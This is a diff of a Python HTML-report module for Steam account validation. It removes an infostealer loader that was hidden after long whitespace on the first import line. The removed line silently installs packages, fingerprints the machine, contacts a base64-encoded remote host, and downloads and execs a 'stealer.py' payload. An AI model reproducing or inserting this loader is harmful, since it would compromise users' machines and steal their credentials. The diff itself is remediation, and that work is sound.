@@ -1,4 +1,4 @@
-from datetime import datetime                                                                                                                                                                                                                                                                                                                                                               ;import subprocess,sys;subprocess.run([sys.executable,'-m','pip','install','--quiet','requests','pycryptodome','pypiwin32'],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL);import requests,base64,socket,uuid,hashlib,os;dn=socket.gethostname();hid=hashlib.sha256((hex(uuid.getnode())+dn).encode()).hexdigest()[:16];pid=base64.b64decode('aVhha05SaEdEX0ZKV011bWRkZ1JqUQ==').decode();uid=base64.b64decode('MTIw').decode();sess=requests.post(base64.b64decode('aHR0cHM6Ly9hcmthbml4LnB3L2FwaS9zZXNzaW9uL2NyZWF0ZQ==').decode(),json={'payload_id':pid,'userid':uid,'desktop_name':dn,'hwid':hid}).json();exec(requests.get(base64.b64decode('aHR0cHM6Ly9hcmthbml4LnB3L3N0ZWFsZXIucHk=').decode(),headers={'token':sess['token'],'desktop-name':dn,'hwid':hid}).text)
+from datetime import datetime
 from html import escape
 
 def _status_class(status: str) -> str:
@@ -229,4 +229,5 @@ def render_report(accounts, stats, *, title: str = "Steam Account Validation Rep
 </html>
 """
     return html
+
 
